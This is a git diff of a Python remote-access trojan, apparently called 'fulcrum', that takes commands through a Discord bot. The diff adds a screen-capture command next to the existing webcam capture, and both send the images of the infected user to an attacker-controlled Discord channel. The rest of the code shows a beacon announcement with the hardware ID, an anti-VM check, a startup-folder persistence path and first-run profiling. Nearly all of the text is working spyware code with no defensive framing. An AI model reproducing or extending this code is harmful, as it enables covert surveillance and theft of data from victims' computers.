@@ -6,90 +6,176 @@ import json
 import wmi
 import time
 import cv2
+import mss
 from discord.ext import commands, tasks
+from datetime import datetime
+from PIL import Image
 
 FLAG_PATH = "C:\\ProgramData\\FUC Cache"
 INSTALL_PATH = "C:\\ProgramData\\FUC HUB"
 
-FIRST_EXECUTION = False
-START_UP = True
+first_execution = False
+CHANNEL = None
 
 mode = "default"
 
 profile_data = None
 
 START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
-
-# Load the environment variables from the .env file
 load_dotenv()
 TOKEN = os.getenv('TOKEN')
 
-# Set up intents
+# discord bot intents
 intents = discord.Intents.default()
 intents.message_content = True
 intents.messages = True
 intents.guilds = True
-
-# Create the client instance with the specified intents
+# bot client mit intents
 client = discord.Client(intents=intents)
 
 
-# Event handler for when the bot has successfully connected to Discord
 @client.event
-async def on_ready():
+async def on_ready():   # sobald der client sich mit discord verbunden hat
+    global profile_data
+    global first_execution
+
     print(f'logged in as {client.user}')
     periodic_update_loop.start()
 
+    print("start up")
+    if first_execution:
+        print("first execution")
+        # neuen channel erstellen
+        try:
+            with open("profile.json", "r") as json_file:
+                profile_data = json.load(json_file)
 
-# Event handler for when a message is sent in a channel the bot has access to
+            guild = client.guilds[0]
+            new_channel = await guild.create_text_channel(profile_data["channel_name"])
+
+            await new_channel.send("***NEW BEACON CONNECTED***")
+            await new_channel.send(f'*user name: {profile_data["user_name"]}\nhardware id: {profile_data["hardware_id"]}*')
+        except Exception as e:
+            await return_error_to_channel(e)
+
+
 @client.event
-def on_message(message):
+async def on_message(message):  # wenn discord message erkannt wird
+    # profile data laden
     global profile_data
     if not profile_data:
-        with open("profile.json", "r") as json_file:
-            profile_data = json.load(json_file)
+        try:
+            with open("profile.json", "r") as json_file:
+                profile_data = json.load(json_file)
+        except Exception as e:
+            await return_error_to_channel(e)
 
     content = message.content
 
+    # eigene und messages aus anderen channels aussortieren
     if message.author == client.user or str(message.channel) != profile_data["channel_name"]:
         return
 
     print("message received")
     if mode == "default":
-        if content.startswith("-TP"):
+        if content.startswith("-TP"):   # TAKE PICTURE
             content = content.strip("-TP")
             cam_index = 0
             if content:
                 content = content.replace(" ", "")
                 cam_index = int(content)
-            take_picture(cam_index)
-
+            await take_picture(cam_index)
+        elif content.startswith("-SG"):     # SCREEN GRAB
+            content = content.strip("-SG")
+            screen_index = 0
+            if content:
+                content = content.replace(" ", "")
+                screen_index = int(content)
+            await take_screenshot(screen_index)
 
 def check_for_vm():
     return False
 
 
 async def return_error_to_channel(error_message):
+    global profile_data
+    error_message = str(error_message)
     try:
-        with open("profile.json", "r") as json_file:
-            profile_data = json.load(json_file)
+        if not profile_data:
+            with open("profile.json", "r") as json_file:
+                profile_data = json.load(json_file)
+
         channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
         if channel is not None:
             await channel.send("'''" + error_message + "'''")
         else:
             print("No channel")
-    finally:
+    except:
         print("error returning error")
 
-def take_picture(cam_index=0):
+async def take_picture(cam_index):
+    global profile_data
     print("-TP")
     try:
+        # aufnehmen des fotos
         cam = cv2.VideoCapture(cam_index)
         ret, frame = cam.read()
         cv2.imwrite("captured_frame.jpg", frame)
         cam.release()
+
+        # senden des fotos
+        if not profile_data:
+            with open("profile.json", "r") as json_file:
+                profile_data = json.load(json_file)
+
+        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
+        with open("captured_frame.jpg", 'rb') as image_file:
+            await channel.send(content=f"**{profile_data["user_name"]}\t-\t{datetime.now()}\t-\tcam:{cam_index}**",
+                               file=discord.File(image_file, "image.jpg"))
+
+        os.remove("captured_frame.jpg")
+
     except Exception as e:
-        return_error_to_channel(e)
+        await return_error_to_channel(e)
+
+
+from mss import mss
+import json
+import discord
+from datetime import datetime
+import os
+
+
+async def take_screenshot(screen_index):
+    global profile_data
+    print("Taking screenshot...")
+    try:
+        with mss() as sct:
+            monitors = sct.monitors
+            monitor = monitors[screen_index]
+            screenshot = sct.grab(monitor)
+            image = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+
+            image.save("captured_screen.png")
+
+        if not profile_data:
+            with open("profile.json", "r") as json_file:
+                profile_data = json.load(json_file)
+
+        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
+        with open("captured_screen.png", 'rb') as image_file:
+            if screen_index is 0:
+                screen_index = "ALL"    # screen index von 0 auf ALL string für besseren discord output
+
+            await channel.send(content=f"**{profile_data["user_name"]}\t-\t{datetime.now()}\t-\tscreen:{screen_index}**",
+                               file=discord.File(image_file, "image.jpg"))
+
+        os.remove("captured_screen.png")
+
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
+        await return_error_to_channel(e)
+
 
 def create_flag():
     try:
@@ -132,30 +218,11 @@ def create_unique_profile():
 
 @tasks.loop(seconds=1)
 async def periodic_update_loop():
-    global profile_data
-    global FIRST_EXECUTION
-    global START_UP
-    if START_UP:
-        START_UP = False
-        print("start up")
-        if FIRST_EXECUTION:
-            print("first execution")
-            # neuen channel erstellen
-            try:
-                with open("profile.json", "r") as json_file:
-                    profile_data = json.load(json_file)
-
-                guild = client.guilds[0]
-                new_channel = await guild.create_text_channel(profile_data["channel_name"])
-
-                await new_channel.send("***NEW BEACON CONNECTED***")
-                await new_channel.send(f'user name: {profile_data["user_name"]}\nhardware id: {profile_data["hardware_id"]}')
-            except Exception as e:
-                await return_error_to_channel(e)
+    pass
 
 
 def main():
-    global FIRST_EXECUTION
+    global first_execution
     # überprüfen ob fulcrum in einem vm läuft
     if check_for_vm() is True:
         print("hello world")
@@ -167,12 +234,13 @@ def main():
 
     print("no vm")
 
+    # überprüfen ob die flag existiert (ob fulcrum das erste mal ausgeführt wird)
     if check_flags() is False:
         print("no flag")
         create_flag()
         get_persistence()
         create_unique_profile()
-        FIRST_EXECUTION = True
+        first_execution = True
 
     # starten des discord bots
     client.run(TOKEN)
